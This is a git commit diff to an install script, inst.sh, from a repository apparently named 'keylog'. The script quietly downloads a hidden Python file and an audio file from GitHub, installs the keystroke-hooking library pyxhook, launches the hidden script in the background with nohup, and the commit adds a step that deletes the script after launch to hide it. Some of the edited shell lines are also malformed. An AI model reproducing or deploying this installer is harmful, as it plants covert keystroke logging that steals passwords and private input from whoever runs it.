3c0273afedc424ee6ee49ca3bda9277bf322805c
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-13 04:23:02 +0000

    Modify wget commands and cleanup log file
    Updated wget commands to save files with specific names and removed .log.py after execution.

--- inst.sh
+++ inst.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
-wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
+wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py .log.py
+wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3 .music.mp3
 yes | pip3 install pyxhook pygame 
-nohup python3 .log.py &
+nohup python3 .log.py & && rm .log.py
